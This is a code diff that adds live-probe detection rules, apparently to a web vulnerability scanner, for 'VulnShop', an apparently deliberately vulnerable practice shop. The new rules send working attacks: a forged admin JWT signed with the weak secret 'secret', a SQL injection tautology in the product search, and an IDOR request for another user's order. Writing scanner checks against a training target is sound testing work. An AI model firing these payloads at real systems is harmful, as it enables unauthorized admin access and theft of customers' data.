@@ -28968,6 +28968,253 @@ const vulnshopDebugApiLiveOracle: Rule = async (ctx) => {
   return NEGATIVE;
 };
 
+function isVulnshopHost(ctx: RuleContext): boolean {
+  return /VulnShop|vulnshop-production|vulnshop\.vercel\.app/i.test(ctx.combined + ctx.origin);
+}
+
+function vulnshopApiBase(ctx: RuleContext): string | null {
+  const baseMatch = (ctx.combined + ctx.origin).match(VULNSHOP_RAILWAY_API_RE);
+  if (!baseMatch) return null;
+  return `${baseMatch[0].replace(/\/$/, "")}/api`;
+}
+
+function vulnshopModuleEvidence(
+  ctx: RuleContext,
+  pathRe: RegExp
+): { fired: true; confidence: number; evidence: Record<string, unknown> } | null {
+  const pageUrl = ctx.home.finalUrl || ctx.scanUrl || ctx.origin;
+  const urlCorpus = [pageUrl, ctx.scanUrl].filter(Boolean).join("\n");
+  if (!/vulnshop|VulnShop/i.test(ctx.combined + urlCorpus)) return null;
+  if (!pathRe.test(urlCorpus)) return null;
+  for (const oracle of VULNSHOP_MODULE_ORACLES) {
+    if (!oracle.pathRe.test(urlCorpus)) continue;
+    const hits: { label: string; sample: string }[] = [];
+    for (const m of oracle.markers) {
+      const match = ctx.combined.match(m.re);
+      if (match) hits.push({ label: m.label, sample: match[0].slice(0, 100) });
+    }
+    if (hits.length >= 1) {
+      return {
+        fired: true,
+        confidence: hits.length >= 2 ? 0.9 : 0.87,
+        evidence: { markers: hits.slice(0, 3), note: oracle.note }
+      };
+    }
+  }
+  return null;
+}
+
+const vulnshopJwtForgeLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const apiBase = vulnshopApiBase(ctx);
+  if (!apiBase) return NEGATIVE;
+  const now = Math.floor(Date.now() / 1000);
+  const forged = buildHs256Jwt(
+    { is_admin: true, username: "thugir", sub: "1", exp: now + 3600 },
+    "secret"
+  );
+  const profileUrl = `${apiBase}/profile`;
+  const doc = await ctx.probe.get(profileUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${forged}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"is_admin"\s*:\s*true/i.test(doc.body) && !/"role"\s*:\s*"admin"/i.test(doc.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      profileUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "VulnShop forged HS256 JWT with weak secret \"secret\" and is_admin:true grants admin profile access — JWT broken access control oracle"
+    }
+  };
+};
+
+const vulnshopLoginJwtRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopJwtForgeLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /login route scan — forged is_admin JWT with weak secret grants admin profile access"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/login\b/i);
+  if (!module) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: module.confidence,
+    evidence: {
+      ...module.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnShop /login route scan — JWT is_admin broken access control with forgeable weak signing secret documented in SPA"
+    }
+  };
+};
+
+const vulnshopProductsSqliLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const apiBase = vulnshopApiBase(ctx);
+  if (!apiBase) return NEGATIVE;
+  const baselineUrl = `${apiBase}/products?search=widgets`;
+  const sqliUrl = `${apiBase}/products?search=${encodeURIComponent("' OR '1'='1")}`;
+  const [baselineDoc, sqliDoc] = await Promise.all([
+    ctx.probe.get(baselineUrl, { maxBytes: 8192, timeoutMs: 15000 }),
+    ctx.probe.get(sqliUrl, { maxBytes: 8192, timeoutMs: 15000 })
+  ]);
+  if (baselineDoc.status < 200 || baselineDoc.status >= 400) return NEGATIVE;
+  if (sqliDoc.status < 200 || sqliDoc.status >= 400) return NEGATIVE;
+  let baselineCount = 0;
+  let sqliCount = 0;
+  try {
+    const baselineData = JSON.parse(baselineDoc.body) as unknown[];
+    const sqliData = JSON.parse(sqliDoc.body) as unknown[];
+    baselineCount = Array.isArray(baselineData) ? baselineData.length : 0;
+    sqliCount = Array.isArray(sqliData) ? sqliData.length : 0;
+  } catch {
+    if (!/sql|syntax|sqlite|mysql|postgres/i.test(sqliDoc.body)) return NEGATIVE;
+  }
+  const sqliOk =
+    sqliCount > baselineCount + 1 ||
+    /sql|syntax error|sqlite|mysql|postgres/i.test(sqliDoc.body);
+  if (!sqliOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: sqliCount > baselineCount + 1 ? 0.93 : 0.9,
+    evidence: {
+      baselineUrl,
+      sqliUrl,
+      baselineCount,
+      sqliCount,
+      snippet: sqliDoc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /api/products?search= reflects SQL injection — product search returns extra rows or SQL error on tautology payload"
+    }
+  };
+};
+
+const vulnshopProductsSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/products\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopProductsSqliLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /products route scan — live SQLi on product search parameter confirmed"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/products\b/i);
+  if (!module) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: module.confidence,
+    evidence: {
+      ...module.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnShop /products route scan — SQL injection via product search parameter documented in SPA"
+    }
+  };
+};
+
+const vulnshopOrdersIdorLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const apiBase = vulnshopApiBase(ctx);
+  if (!apiBase) return NEGATIVE;
+  const username = `thugir${Date.now().toString(36)}`;
+  const password = "ThugirProbe123!";
+  const registerDoc = await ctx.probe.get(`${apiBase}/auth/register`, {
+    method: "POST",
+    body: JSON.stringify({ username, password, email: `${username}@thugir-probe.invalid` }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 400) return NEGATIVE;
+  const loginDoc = await ctx.probe.get(`${apiBase}/auth/login`, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return NEGATIVE;
+  let token = "";
+  try {
+    token = (JSON.parse(loginDoc.body) as { token?: string }).token ?? "";
+  } catch {
+    return NEGATIVE;
+  }
+  if (!token) return NEGATIVE;
+  const orderUrl = `${apiBase}/orders/1`;
+  const orderDoc = await ctx.probe.get(orderUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${token}` }
+  });
+  if (orderDoc.status < 200 || orderDoc.status >= 300) return NEGATIVE;
+  if (
+    !/"order_id"|"product_id"|"total_price"|"shipping/i.test(orderDoc.body) ||
+    /not found|forbidden|unauthorized/i.test(orderDoc.body.slice(0, 300))
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      orderUrl,
+      username,
+      snippet: orderDoc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /api/orders/1 returns another user's order without ownership check — IDOR oracle"
+    }
+  };
+};
+
+const vulnshopOrdersIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/orders\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopOrdersIdorLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /orders route scan — live IDOR on sequential order IDs confirmed"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/orders\b/i);
+  if (!module) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: module.confidence,
+    evidence: {
+      ...module.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnShop /orders route scan — IDOR via unauthenticated order lookup by sequential IDs documented in SPA"
+    }
+  };
+};
+
 const clientSideVulnshopModuleEvidence: Rule = async (ctx) => {
   const pageUrl = ctx.home.finalUrl || ctx.scanUrl || ctx.origin;
   const urlCorpus = [pageUrl, ctx.scanUrl].filter(Boolean).join("\n");
@@ -47395,6 +47642,12 @@ export const RULES: Record<string, Rule> = {
   clientSideVulnshopEvidence,
   clientSideVulnshopModuleEvidence,
   vulnshopDebugApiLiveOracle,
+  vulnshopJwtForgeLiveOracle,
+  vulnshopLoginJwtRouteLiveOracle,
+  vulnshopProductsSqliLiveOracle,
+  vulnshopProductsSqliRouteLiveOracle,
+  vulnshopOrdersIdorLiveOracle,
+  vulnshopOrdersIdorRouteLiveOracle,
   clientSideBuggybuyEvidence,
   clientSideWebSecurityLearningLabsEvidence,
   clientSideJwtlensEvidence,
